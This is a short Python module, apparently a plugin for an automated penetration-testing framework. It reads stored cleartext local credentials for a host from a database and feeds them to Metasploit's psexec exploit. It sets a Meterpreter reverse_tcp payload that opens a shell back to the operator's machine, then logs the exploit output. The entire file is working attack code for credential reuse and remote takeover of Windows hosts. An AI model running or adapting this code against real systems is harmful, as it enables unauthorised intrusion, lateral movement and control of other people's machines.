from msf import exploit

def run(params):
    sql = "select hd.ip_address, lc.username, lc.cleartext_password, hd.id from host_data hd join local_credentials lc on hd.id = lc.host_data_id where lc.id = %s and lc.cleartext_password != ''"
    cursor = params.db.cursor()
    cursor.execute(sql, (params.item_identifier, ))
    row = cursor.fetchone()
    #print "log into host {0} with local creds {1}:{2}".format(row[0], row[1], row[2])
    #params.log("log into host {0} with local creds {1}:{2}".format(row[0], row[1], row[2]))
    cursor.close()
    
    setup = [
        "use exploit/windows/smb/psexec", 
        "set PAYLOAD windows/meterpreter/reverse_tcp", 
        "set RHOST {0}".format(row[0]),
        "set LHOST {0}".format(params.getLocalHost()),
        "set LPORT {0}".format(params.getOpenPort()),
        "set smbuser {0}".format(row[1]),
        "set smbpass {0}".format(row[2]),
        "exploit"
    ]
    
    log = ""
    for l in exploit.runMsf(params, row[3], setup, "psexec"):
        log = log + l + "\r\n"
        params.log(l)
    
    cursor = params.db.cursor()
    cursor.execute("insert into exploit_logs (host_data_id, vulnerability_description_id, log) values(%s, %s, %s)", (row[3], 4, log, ))
    cursor.close()
